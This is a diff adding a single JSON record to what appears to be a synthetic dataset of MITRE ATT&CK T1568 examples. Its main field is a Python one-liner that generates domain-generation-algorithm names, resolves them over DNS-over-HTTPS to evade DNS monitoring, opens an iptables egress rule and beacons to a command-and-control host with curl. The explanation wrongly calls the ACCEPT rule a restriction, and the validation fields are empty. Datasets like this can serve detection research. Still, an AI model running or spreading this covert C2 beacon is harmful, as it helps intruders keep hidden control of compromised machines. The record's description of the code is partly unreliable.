@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import json,random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ops-key-2'; tlds=['xyz','com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ip=None; port=random.choice([10443,23502,18080])\nfor d in dga(25):\n    try:\n        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json','https://cloudflare-dns.com/dns-query?name='+d+'&type=A'],timeout=5)\n        ans=json.loads(j).get('Answer',[])\n        ip=next((a.get('data') for a in ans if a.get('type')==1),None)\n        if ip:\n            dom=d; break\n    except Exception:\n        pass\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/status','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Resolves a DGA domain through DNS-over-HTTPS (DoH) for stealthy dynamic C2 discovery, then restricts egress to the resolved IP and a nonstandard TLS port.",
+  "rationale_steps": [
+    "Generate multiple DGA candidates seeded by date.",
+    "Query DoH JSON API to avoid traditional DNS telemetry and caching.",
+    "Extract first A record and open egress only to that IP/port via iptables.",
+    "Beacon via curl using --resolve to force IP use with correct Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-4ccc05ea",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
